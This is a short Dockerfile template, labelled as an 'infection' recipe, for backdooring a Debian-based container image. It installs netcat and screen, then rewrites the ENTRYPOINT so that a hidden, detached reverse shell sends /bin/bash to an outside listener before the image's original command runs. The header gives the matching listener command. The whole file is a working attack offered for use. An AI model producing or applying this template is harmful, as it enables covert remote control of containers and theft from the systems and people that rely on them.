#### Description ############################################################################
# Infection type:  Reverse shell (netcat)
# Distribution:    Debian
# Listener:        rlwrap -cAr nc -lvnp <listening_port>
####

FROM <name_of_image_to_infect>

RUN apt-get update && apt-get install screen netcat -y
ENTRYPOINT screen -d -m nc <listening_address> <listening_port> -e /bin/bash && <original_ENTRYPOINT_command> <original_CMD_command>
